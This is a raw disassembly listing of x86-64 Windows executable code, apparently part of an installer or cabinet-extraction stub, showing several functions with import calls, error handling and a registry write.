   140005ea7:	48 8d 05 02 fb ff ff 	lea    -0x4fe(%rip),%rax        # 0x1400059b0
   140005eae:	49 89 43 a0          	mov    %rax,-0x60(%r11)
   140005eb2:	48 8d 05 17 fa ff ff 	lea    -0x5e9(%rip),%rax        # 0x1400058d0
   140005eb9:	49 89 43 98          	mov    %rax,-0x68(%r11)
   140005ebd:	48 ff 15 0c 33 00 00 	rex.W call *0x330c(%rip)        # 0x1400091d0
   140005ec4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005ec9:	48 8b f8             	mov    %rax,%rdi
   140005ecc:	48 85 c0             	test   %rax,%rax
   140005ecf:	74 7c                	je     0x140005f4d
   140005ed1:	ba 00 80 00 00       	mov    $0x8000,%edx
   140005ed6:	48 8d 0d 23 63 00 00 	lea    0x6323(%rip),%rcx        # 0x14000c200
   140005edd:	41 b8 80 01 00 00    	mov    $0x180,%r8d
   140005ee3:	e8 d8 f6 ff ff       	call   0x1400055c0
   140005ee8:	48 8b d8             	mov    %rax,%rbx
   140005eeb:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005eef:	74 5c                	je     0x140005f4d
   140005ef1:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140005ef6:	48 8b d0             	mov    %rax,%rdx
   140005ef9:	48 8b cf             	mov    %rdi,%rcx
   140005efc:	48 ff 15 d5 32 00 00 	rex.W call *0x32d5(%rip)        # 0x1400091d8
   140005f03:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005f08:	85 c0                	test   %eax,%eax
   140005f0a:	74 41                	je     0x140005f4d
   140005f0c:	8b 05 56 76 00 00    	mov    0x7656(%rip),%eax        # 0x14000d568
   140005f12:	39 44 24 50          	cmp    %eax,0x50(%rsp)
   140005f16:	75 35                	jne    0x140005f4d
   140005f18:	83 7c 24 60 00       	cmpl   $0x0,0x60(%rsp)
   140005f1d:	75 2e                	jne    0x140005f4d
   140005f1f:	83 7c 24 64 00       	cmpl   $0x0,0x64(%rsp)
   140005f24:	75 27                	jne    0x140005f4d
   140005f26:	48 8b cb             	mov    %rbx,%rcx
   140005f29:	e8 82 fa ff ff       	call   0x1400059b0
   140005f2e:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005f31:	74 1a                	je     0x140005f4d
   140005f33:	48 8b cf             	mov    %rdi,%rcx
   140005f36:	48 ff 15 a3 32 00 00 	rex.W call *0x32a3(%rip)        # 0x1400091e0
   140005f3d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005f42:	85 c0                	test   %eax,%eax
   140005f44:	74 07                	je     0x140005f4d
   140005f46:	b8 01 00 00 00       	mov    $0x1,%eax
   140005f4b:	eb 02                	jmp    0x140005f4f
   140005f4d:	33 c0                	xor    %eax,%eax
   140005f4f:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140005f54:	48 33 cc             	xor    %rsp,%rcx
   140005f57:	e8 94 27 00 00       	call   0x1400086f0
   140005f5c:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140005f63:	00 
   140005f64:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140005f6b:	5f                   	pop    %rdi
   140005f6c:	c3                   	ret
   140005f6d:	cc                   	int3
   140005f6e:	cc                   	int3
   140005f6f:	cc                   	int3
   140005f70:	cc                   	int3
   140005f71:	cc                   	int3
   140005f72:	cc                   	int3
   140005f73:	cc                   	int3
   140005f74:	cc                   	int3
   140005f75:	cc                   	int3
   140005f76:	cc                   	int3
   140005f77:	cc                   	int3
   140005f78:	71 30                	jno    0x140005faa
   140005f7a:	52                   	push   %rdx
   140005f7b:	5e                   	pop    %rsi
   140005f7c:	47 27                	rex.RXB (bad)
   140005f7e:	05 d3 48 89 5c       	add    $0x5c8948d3,%eax
   140005f83:	24 08                	and    $0x8,%al
   140005f85:	57                   	push   %rdi
   140005f86:	48 83 ec 50          	sub    $0x50,%rsp
   140005f8a:	45 33 c0             	xor    %r8d,%r8d
   140005f8d:	48 8d 0d 0c 3a 00 00 	lea    0x3a0c(%rip),%rcx        # 0x1400099a0
   140005f94:	33 d2                	xor    %edx,%edx
   140005f96:	e8 5d f2 ff ff       	call   0x1400051f8
   140005f9b:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140005fa1:	89 05 c1 75 00 00    	mov    %eax,0x75c1(%rip)        # 0x14000d568
   140005fa7:	48 8d 15 f2 39 00 00 	lea    0x39f2(%rip),%rdx        # 0x1400099a0
   140005fae:	33 c9                	xor    %ecx,%ecx
   140005fb0:	48 ff 15 51 33 00 00 	rex.W call *0x3351(%rip)        # 0x140009308
   140005fb7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005fbc:	48 8b d0             	mov    %rax,%rdx
   140005fbf:	33 c9                	xor    %ecx,%ecx
   140005fc1:	48 ff 15 d0 33 00 00 	rex.W call *0x33d0(%rip)        # 0x140009398
   140005fc8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005fcd:	48 8b c8             	mov    %rax,%rcx
   140005fd0:	48 ff 15 a1 33 00 00 	rex.W call *0x33a1(%rip)        # 0x140009378
   140005fd7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005fdc:	48 89 05 7d 75 00 00 	mov    %rax,0x757d(%rip)        # 0x14000d560
   140005fe3:	48 85 c0             	test   %rax,%rax
   140005fe6:	0f 84 d5 01 00 00    	je     0x1400061c1
   140005fec:	48 8b 0d 35 68 00 00 	mov    0x6835(%rip),%rcx        # 0x14000c828
   140005ff3:	48 85 c9             	test   %rcx,%rcx
   140005ff6:	74 4e                	je     0x140006046
   140005ff8:	ba 42 08 00 00       	mov    $0x842,%edx
   140005ffd:	48 ff 15 0c 35 00 00 	rex.W call *0x350c(%rip)        # 0x140009510
   140006004:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006009:	48 8b c8             	mov    %rax,%rcx
   14000600c:	33 d2                	xor    %edx,%edx
   14000600e:	48 ff 15 9b 34 00 00 	rex.W call *0x349b(%rip)        # 0x1400094b0
   140006015:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000601a:	48 8b 0d 07 68 00 00 	mov    0x6807(%rip),%rcx        # 0x14000c828
   140006021:	ba 41 08 00 00       	mov    $0x841,%edx
   140006026:	48 ff 15 e3 34 00 00 	rex.W call *0x34e3(%rip)        # 0x140009510
   14000602d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006032:	48 8b c8             	mov    %rax,%rcx
   140006035:	ba 05 00 00 00       	mov    $0x5,%edx
   14000603a:	48 ff 15 6f 34 00 00 	rex.W call *0x346f(%rip)        # 0x1400094b0
   140006041:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006046:	e8 f9 fd ff ff       	call   0x140005e44
   14000604b:	85 c0                	test   %eax,%eax
   14000604d:	75 0a                	jne    0x140006059
   14000604f:	ba ba 04 00 00       	mov    $0x4ba,%edx
   140006054:	e9 cb 00 00 00       	jmp    0x140006124
   140006059:	48 8d 05 0c 75 00 00 	lea    0x750c(%rip),%rax        # 0x14000d56c
   140006060:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140006065:	4c 8d 0d b4 f7 ff ff 	lea    -0x84c(%rip),%r9        # 0x140005820
   14000606c:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140006073:	00 
   140006074:	48 8d 05 a5 f9 ff ff 	lea    -0x65b(%rip),%rax        # 0x140005a20
   14000607b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006080:	4c 8d 05 39 f5 ff ff 	lea    -0xac7(%rip),%r8        # 0x1400055c0
   140006087:	48 8d 05 22 f9 ff ff 	lea    -0x6de(%rip),%rax        # 0x1400059b0
   14000608e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006093:	48 8d 15 36 fa ff ff 	lea    -0x5ca(%rip),%rdx        # 0x140005ad0
   14000609a:	48 8d 05 2f f8 ff ff 	lea    -0x7d1(%rip),%rax        # 0x1400058d0
   1400060a1:	48 8d 0d 08 fa ff ff 	lea    -0x5f8(%rip),%rcx        # 0x140005ab0
   1400060a8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400060ad:	48 ff 15 1c 31 00 00 	rex.W call *0x311c(%rip)        # 0x1400091d0
   1400060b4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400060b9:	48 8b f8             	mov    %rax,%rdi
   1400060bc:	48 85 c0             	test   %rax,%rax
   1400060bf:	74 57                	je     0x140006118
   1400060c1:	48 8d 05 98 74 00 00 	lea    0x7498(%rip),%rax        # 0x14000d560
   1400060c8:	45 33 c9             	xor    %r9d,%r9d
   1400060cb:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400060d0:	4c 8d 05 89 36 00 00 	lea    0x3689(%rip),%r8        # 0x140009760
   1400060d7:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   1400060dd:	48 8d 05 0c fa ff ff 	lea    -0x5f4(%rip),%rax        # 0x140005af0
   1400060e4:	48 8d 15 15 61 00 00 	lea    0x6115(%rip),%rdx        # 0x14000c200
   1400060eb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400060f0:	48 8b cf             	mov    %rdi,%rcx
   1400060f3:	48 ff 15 ee 30 00 00 	rex.W call *0x30ee(%rip)        # 0x1400091e8
   1400060fa:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400060ff:	8b d8                	mov    %eax,%ebx
   140006101:	85 c0                	test   %eax,%eax
   140006103:	74 40                	je     0x140006145
   140006105:	48 8b cf             	mov    %rdi,%rcx
   140006108:	48 ff 15 d1 30 00 00 	rex.W call *0x30d1(%rip)        # 0x1400091e0
   14000610f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006114:	85 c0                	test   %eax,%eax
   140006116:	75 2d                	jne    0x140006145
   140006118:	8b 15 4e 74 00 00    	mov    0x744e(%rip),%edx        # 0x14000d56c
   14000611e:	81 c2 14 05 00 00    	add    $0x514,%edx
   140006124:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140006129:	45 33 c9             	xor    %r9d,%r9d
   14000612c:	48 8b 0d f5 66 00 00 	mov    0x66f5(%rip),%rcx        # 0x14000c828
   140006133:	45 33 c0             	xor    %r8d,%r8d
   140006136:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000613d:	00 
   14000613e:	e8 e9 ed ff ff       	call   0x140004f2c
   140006143:	33 db                	xor    %ebx,%ebx
   140006145:	48 8b 0d 14 74 00 00 	mov    0x7414(%rip),%rcx        # 0x14000d560
   14000614c:	48 85 c9             	test   %rcx,%rcx
   14000614f:	74 14                	je     0x140006165
   140006151:	48 ff 15 d8 31 00 00 	rex.W call *0x31d8(%rip)        # 0x140009330
   140006158:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000615d:	48 83 25 fb 73 00 00 	andq   $0x0,0x73fb(%rip)        # 0x14000d560
   140006164:	00 
   140006165:	85 db                	test   %ebx,%ebx
   140006167:	75 26                	jne    0x14000618f
   140006169:	39 1d 8d 74 00 00    	cmp    %ebx,0x748d(%rip)        # 0x14000d5fc
   14000616f:	75 1e                	jne    0x14000618f
   140006171:	21 5c 24 28          	and    %ebx,0x28(%rsp)
   140006175:	45 33 c9             	xor    %r9d,%r9d
   140006178:	45 33 c0             	xor    %r8d,%r8d
   14000617b:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006182:	00 
   140006183:	ba f8 04 00 00       	mov    $0x4f8,%edx
   140006188:	33 c9                	xor    %ecx,%ecx
   14000618a:	e8 9d ed ff ff       	call   0x140004f2c
   14000618f:	f6 05 82 6b 00 00 01 	testb  $0x1,0x6b82(%rip)        # 0x14000cd18
   140006196:	75 27                	jne    0x1400061bf
   140006198:	f6 05 c5 7c 00 00 01 	testb  $0x1,0x7cc5(%rip)        # 0x14000de64
   14000619f:	75 1e                	jne    0x1400061bf
   1400061a1:	48 8b 0d 80 66 00 00 	mov    0x6680(%rip),%rcx        # 0x14000c828
   1400061a8:	45 33 c9             	xor    %r9d,%r9d
   1400061ab:	4c 63 c3             	movslq %ebx,%r8
   1400061ae:	ba a1 0f 00 00       	mov    $0xfa1,%edx
   1400061b3:	48 ff 15 4e 33 00 00 	rex.W call *0x334e(%rip)        # 0x140009508
   1400061ba:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400061bf:	8b c3                	mov    %ebx,%eax
   1400061c1:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400061c6:	48 83 c4 50          	add    $0x50,%rsp
   1400061ca:	5f                   	pop    %rdi
   1400061cb:	c3                   	ret
   1400061cc:	cc                   	int3
   1400061cd:	cc                   	int3
   1400061ce:	cc                   	int3
   1400061cf:	cc                   	int3
   1400061d0:	cc                   	int3
   1400061d1:	cc                   	int3
   1400061d2:	cc                   	int3
   1400061d3:	cc                   	int3
   1400061d4:	48 83 ec 38          	sub    $0x38,%rsp
   1400061d8:	41 b8 24 00 00 00    	mov    $0x24,%r8d
   1400061de:	48 8d 15 db 6a 00 00 	lea    0x6adb(%rip),%rdx        # 0x14000ccc0
   1400061e5:	48 8d 0d bc 37 00 00 	lea    0x37bc(%rip),%rcx        # 0x1400099a8
   1400061ec:	e8 07 f0 ff ff       	call   0x1400051f8
   1400061f1:	83 f8 24             	cmp    $0x24,%eax
   1400061f4:	74 2d                	je     0x140006223
   1400061f6:	ba b1 04 00 00       	mov    $0x4b1,%edx
   1400061fb:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140006200:	45 33 c9             	xor    %r9d,%r9d
   140006203:	45 33 c0             	xor    %r8d,%r8d
   140006206:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000620d:	00 
   14000620e:	33 c9                	xor    %ecx,%ecx
   140006210:	e8 17 ed ff ff       	call   0x140004f2c
   140006215:	c7 05 25 73 00 00 14 	movl   $0x80070714,0x7325(%rip)        # 0x14000d544
   14000621c:	07 07 80 
   14000621f:	33 c0                	xor    %eax,%eax
   140006221:	eb 65                	jmp    0x140006288
   140006223:	8b 05 b7 6a 00 00    	mov    0x6ab7(%rip),%eax        # 0x14000cce0
   140006229:	89 05 f5 75 00 00    	mov    %eax,0x75f5(%rip)        # 0x14000d824
   14000622f:	85 c0                	test   %eax,%eax
   140006231:	75 07                	jne    0x14000623a
   140006233:	ba c6 04 00 00       	mov    $0x4c6,%edx
   140006238:	eb c1                	jmp    0x1400061fb
   14000623a:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140006240:	48 8d 15 21 7c 00 00 	lea    0x7c21(%rip),%rdx        # 0x14000de68
   140006247:	48 8d 0d 6a 37 00 00 	lea    0x376a(%rip),%rcx        # 0x1400099b8
   14000624e:	e8 a5 ef ff ff       	call   0x1400051f8
   140006253:	48 8d 0d 56 18 00 00 	lea    0x1856(%rip),%rcx        # 0x140007ab0
   14000625a:	e8 25 17 00 00       	call   0x140007984
   14000625f:	85 c0                	test   %eax,%eax
   140006261:	75 20                	jne    0x140006283
   140006263:	21 44 24 28          	and    %eax,0x28(%rsp)
   140006267:	45 33 c9             	xor    %r9d,%r9d
   14000626a:	45 33 c0             	xor    %r8d,%r8d
   14000626d:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006274:	00 
   140006275:	ba c6 04 00 00       	mov    $0x4c6,%edx
   14000627a:	33 c9                	xor    %ecx,%ecx
   14000627c:	e8 ab ec ff ff       	call   0x140004f2c
   140006281:	eb 9c                	jmp    0x14000621f
   140006283:	b8 01 00 00 00       	mov    $0x1,%eax
   140006288:	48 83 c4 38          	add    $0x38,%rsp
   14000628c:	c3                   	ret
   14000628d:	cc                   	int3
   14000628e:	cc                   	int3
   14000628f:	cc                   	int3
   140006290:	cc                   	int3
   140006291:	cc                   	int3
   140006292:	cc                   	int3
   140006293:	cc                   	int3
   140006294:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006299:	57                   	push   %rdi
   14000629a:	48 83 ec 30          	sub    $0x30,%rsp
   14000629e:	45 33 c0             	xor    %r8d,%r8d
   1400062a1:	48 8d 0d 20 37 00 00 	lea    0x3720(%rip),%rcx        # 0x1400099c8
   1400062a8:	33 d2                	xor    %edx,%edx
   1400062aa:	e8 49 ef ff ff       	call   0x1400051f8
   1400062af:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400062b4:	8b d8                	mov    %eax,%ebx
   1400062b6:	8d 50 01             	lea    0x1(%rax),%edx
   1400062b9:	48 ff 15 28 31 00 00 	rex.W call *0x3128(%rip)        # 0x1400093e8
   1400062c0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400062c5:	48 8b f8             	mov    %rax,%rdi
   1400062c8:	48 85 c0             	test   %rax,%rax
   1400062cb:	75 2e                	jne    0x1400062fb
   1400062cd:	21 44 24 28          	and    %eax,0x28(%rsp)
   1400062d1:	45 33 c9             	xor    %r9d,%r9d
   1400062d4:	45 33 c0             	xor    %r8d,%r8d
   1400062d7:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400062de:	00 
   1400062df:	ba b5 04 00 00       	mov    $0x4b5,%edx
   1400062e4:	33 c9                	xor    %ecx,%ecx
   1400062e6:	e8 41 ec ff ff       	call   0x140004f2c
   1400062eb:	e8 68 16 00 00       	call   0x140007958
   1400062f0:	89 05 4e 72 00 00    	mov    %eax,0x724e(%rip)        # 0x14000d544
   1400062f6:	e9 ca 00 00 00       	jmp    0x1400063c5
   1400062fb:	44 8b c3             	mov    %ebx,%r8d
   1400062fe:	48 8d 0d c3 36 00 00 	lea    0x36c3(%rip),%rcx        # 0x1400099c8
   140006305:	48 8b d7             	mov    %rdi,%rdx
   140006308:	e8 eb ee ff ff       	call   0x1400051f8
   14000630d:	85 c0                	test   %eax,%eax
   14000630f:	75 39                	jne    0x14000634a
   140006311:	21 44 24 28          	and    %eax,0x28(%rsp)
   140006315:	45 33 c9             	xor    %r9d,%r9d
   140006318:	45 33 c0             	xor    %r8d,%r8d
   14000631b:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006322:	00 
   140006323:	ba b1 04 00 00       	mov    $0x4b1,%edx
   140006328:	33 c9                	xor    %ecx,%ecx
   14000632a:	e8 fd eb ff ff       	call   0x140004f2c
   14000632f:	48 8b cf             	mov    %rdi,%rcx
   140006332:	48 ff 15 57 2f 00 00 	rex.W call *0x2f57(%rip)        # 0x140009290
   140006339:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000633e:	c7 05 fc 71 00 00 14 	movl   $0x80070714,0x71fc(%rip)        # 0x14000d544
   140006345:	07 07 80 
   140006348:	eb 7b                	jmp    0x1400063c5
   14000634a:	48 8d 15 b7 35 00 00 	lea    0x35b7(%rip),%rdx        # 0x140009908
   140006351:	48 8b cf             	mov    %rdi,%rcx
   140006354:	48 ff 15 95 30 00 00 	rex.W call *0x3095(%rip)        # 0x1400093f0
   14000635b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006360:	85 c0                	test   %eax,%eax
   140006362:	75 16                	jne    0x14000637a
   140006364:	48 8b cf             	mov    %rdi,%rcx
   140006367:	48 ff 15 22 2f 00 00 	rex.W call *0x2f22(%rip)        # 0x140009290
   14000636e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006373:	b8 01 00 00 00       	mov    $0x1,%eax
   140006378:	eb 4d                	jmp    0x1400063c7
   14000637a:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140006381:	00 
   140006382:	45 33 c9             	xor    %r9d,%r9d
   140006385:	4c 8b c7             	mov    %rdi,%r8
   140006388:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   14000638f:	00 
   140006390:	ba e9 03 00 00       	mov    $0x3e9,%edx
   140006395:	33 c9                	xor    %ecx,%ecx
   140006397:	e8 90 eb ff ff       	call   0x140004f2c
   14000639c:	48 8b cf             	mov    %rdi,%rcx
   14000639f:	8b d8                	mov    %eax,%ebx
   1400063a1:	48 ff 15 e8 2e 00 00 	rex.W call *0x2ee8(%rip)        # 0x140009290
   1400063a8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400063ad:	83 fb 06             	cmp    $0x6,%ebx
   1400063b0:	75 09                	jne    0x1400063bb
   1400063b2:	83 25 8b 71 00 00 00 	andl   $0x0,0x718b(%rip)        # 0x14000d544
   1400063b9:	eb b8                	jmp    0x140006373
   1400063bb:	c7 05 7f 71 00 00 c7 	movl   $0x800704c7,0x717f(%rip)        # 0x14000d544
   1400063c2:	04 07 80 
   1400063c5:	33 c0                	xor    %eax,%eax
   1400063c7:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400063cc:	48 83 c4 30          	add    $0x30,%rsp
   1400063d0:	5f                   	pop    %rdi
   1400063d1:	c3                   	ret
   1400063d2:	cc                   	int3
   1400063d3:	cc                   	int3
   1400063d4:	cc                   	int3
   1400063d5:	cc                   	int3
   1400063d6:	cc                   	int3
   1400063d7:	cc                   	int3
   1400063d8:	cc                   	int3
   1400063d9:	cc                   	int3
   1400063da:	cc                   	int3
   1400063db:	cc                   	int3
   1400063dc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400063e1:	57                   	push   %rdi
   1400063e2:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   1400063e9:	48 8b 05 18 5c 00 00 	mov    0x5c18(%rip),%rax        # 0x14000c008
   1400063f0:	48 33 c4             	xor    %rsp,%rax
   1400063f3:	48 89 84 24 50 01 00 	mov    %rax,0x150(%rsp)
   1400063fa:	00 
   1400063fb:	48 8b 1d 06 72 00 00 	mov    0x7206(%rip),%rbx        # 0x14000d608
   140006402:	eb 5a                	jmp    0x14000645e
   140006404:	83 3d f9 68 00 00 00 	cmpl   $0x0,0x68f9(%rip)        # 0x14000cd04
   14000640b:	48 8b fb             	mov    %rbx,%rdi
   14000640e:	75 2c                	jne    0x14000643c
   140006410:	83 3d 49 7a 00 00 00 	cmpl   $0x0,0x7a49(%rip)        # 0x14000de60
   140006417:	75 23                	jne    0x14000643c
   140006419:	48 8b 0b             	mov    (%rbx),%rcx
   14000641c:	ba 80 00 00 00       	mov    $0x80,%edx
   140006421:	48 ff 15 50 2e 00 00 	rex.W call *0x2e50(%rip)        # 0x140009278
   140006428:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000642d:	48 8b 0b             	mov    (%rbx),%rcx
   140006430:	48 ff 15 09 2e 00 00 	rex.W call *0x2e09(%rip)        # 0x140009240
   140006437:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000643c:	48 8b 0f             	mov    (%rdi),%rcx
   14000643f:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140006443:	48 ff 15 46 2e 00 00 	rex.W call *0x2e46(%rip)        # 0x140009290
   14000644a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000644f:	48 8b cf             	mov    %rdi,%rcx
   140006452:	48 ff 15 37 2e 00 00 	rex.W call *0x2e37(%rip)        # 0x140009290
   140006459:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000645e:	48 85 db             	test   %rbx,%rbx
   140006461:	75 a1                	jne    0x140006404
   140006463:	8b 05 97 68 00 00    	mov    0x6897(%rip),%eax        # 0x14000cd00
   140006469:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000646e:	85 c0                	test   %eax,%eax
   140006470:	0f 84 91 00 00 00    	je     0x140006507
   140006476:	83 3d 87 68 00 00 00 	cmpl   $0x0,0x6887(%rip)        # 0x14000cd04
   14000647d:	0f 85 84 00 00 00    	jne    0x140006507
   140006483:	83 3d d6 79 00 00 00 	cmpl   $0x0,0x79d6(%rip)        # 0x14000de60
   14000648a:	75 7b                	jne    0x140006507
   14000648c:	4c 8d 05 7d 71 00 00 	lea    0x717d(%rip),%r8        # 0x14000d610
   140006493:	ba 04 01 00 00       	mov    $0x104,%edx
   140006498:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000649d:	4c 2b c0             	sub    %rax,%r8
   1400064a0:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400064a5:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   1400064ac:	48 85 c0             	test   %rax,%rax
   1400064af:	74 12                	je     0x1400064c3
   1400064b1:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   1400064b5:	84 c0                	test   %al,%al
   1400064b7:	74 0a                	je     0x1400064c3
   1400064b9:	88 01                	mov    %al,(%rcx)
   1400064bb:	48 03 cb             	add    %rbx,%rcx
   1400064be:	48 2b d3             	sub    %rbx,%rdx
   1400064c1:	75 e2                	jne    0x1400064a5
   1400064c3:	48 85 d2             	test   %rdx,%rdx
   1400064c6:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400064ca:	48 0f 45 c1          	cmovne %rcx,%rax
   1400064ce:	f6 05 8f 79 00 00 20 	testb  $0x20,0x798f(%rip)        # 0x14000de64
   1400064d5:	c6 00 00             	movb   $0x0,(%rax)
   1400064d8:	74 0a                	je     0x1400064e4
   1400064da:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400064df:	e8 bc 19 00 00       	call   0x140007ea0
   1400064e4:	48 8d 0d 45 33 00 00 	lea    0x3345(%rip),%rcx        # 0x140009830
   1400064eb:	48 ff 15 4e 2e 00 00 	rex.W call *0x2e4e(%rip)        # 0x140009340
   1400064f2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400064f7:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400064fc:	e8 33 bb ff ff       	call   0x140002034
   140006501:	8b 05 f9 67 00 00    	mov    0x67f9(%rip),%eax        # 0x14000cd00
   140006507:	66 39 1d 6a 79 00 00 	cmp    %bx,0x796a(%rip)        # 0x14000de78
   14000650e:	74 67                	je     0x140006577
   140006510:	85 c0                	test   %eax,%eax
   140006512:	74 63                	je     0x140006577
   140006514:	80 3d b5 62 00 00 00 	cmpb   $0x0,0x62b5(%rip)        # 0x14000c7d0
   14000651b:	74 5a                	je     0x140006577
   14000651d:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140006522:	41 b9 06 00 02 00    	mov    $0x20006,%r9d
   140006528:	45 33 c0             	xor    %r8d,%r8d
   14000652b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006530:	48 8d 15 51 5b 00 00 	lea    0x5b51(%rip),%rdx        # 0x14000c088
   140006537:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   14000653e:	48 ff 15 13 2c 00 00 	rex.W call *0x2c13(%rip)        # 0x140009158
   140006545:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000654a:	85 c0                	test   %eax,%eax
   14000654c:	75 29                	jne    0x140006577
   14000654e:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006553:	48 8d 15 76 62 00 00 	lea    0x6276(%rip),%rdx        # 0x14000c7d0
   14000655a:	48 ff 15 ef 2b 00 00 	rex.W call *0x2bef(%rip)        # 0x140009150
   140006561:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006566:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000656b:	48 ff 15 36 2c 00 00 	rex.W call *0x2c36(%rip)        # 0x1400091a8
   140006572:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006577:	83 25 82 67 00 00 00 	andl   $0x0,0x6782(%rip)        # 0x14000cd00
   14000657e:	48 8b 8c 24 50 01 00 	mov    0x150(%rsp),%rcx
   140006585:	00 
   140006586:	48 33 cc             	xor    %rsp,%rcx
   140006589:	e8 62 21 00 00       	call   0x1400086f0
   14000658e:	48 8b 9c 24 70 01 00 	mov    0x170(%rsp),%rbx
   140006595:	00 
   140006596:	48 81 c4 60 01 00 00 	add    $0x160,%rsp
   14000659d:	5f                   	pop    %rdi
   14000659e:	c3                   	ret
   14000659f:	cc                   	int3
   1400065a0:	cc                   	int3
   1400065a1:	cc                   	int3
   1400065a2:	cc                   	int3
   1400065a3:	cc                   	int3
   1400065a4:	cc                   	int3
   1400065a5:	cc                   	int3
   1400065a6:	cc                   	int3
   1400065a7:	cc                   	int3
   1400065a8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400065ad:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400065b2:	56                   	push   %rsi
   1400065b3:	57                   	push   %rdi
   1400065b4:	41 56                	push   %r14
   1400065b6:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   1400065bd:	48 8b 05 44 5a 00 00 	mov    0x5a44(%rip),%rax        # 0x14000c008
   1400065c4:	48 33 c4             	xor    %rsp,%rax
   1400065c7:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   1400065ce:	00 
   1400065cf:	33 db                	xor    %ebx,%ebx
   1400065d1:	4c 8b f1             	mov    %rcx,%r14
   1400065d4:	8b f3                	mov    %ebx,%esi
   1400065d6:	4c 2b f2             	sub    %rdx,%r14
   1400065d9:	48 8b fa             	mov    %rdx,%rdi
   1400065dc:	48 8b e9             	mov    %rcx,%rbp
   1400065df:	44 8b ce             	mov    %esi,%r9d
   1400065e2:	4c 8d 05 e7 33 00 00 	lea    0x33e7(%rip),%r8        # 0x1400099d0
   1400065e9:	ba 04 01 00 00       	mov    $0x104,%edx
   1400065ee:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400065f3:	e8 c4 aa ff ff       	call   0x1400010bc
   1400065f8:	ff c6                	inc    %esi
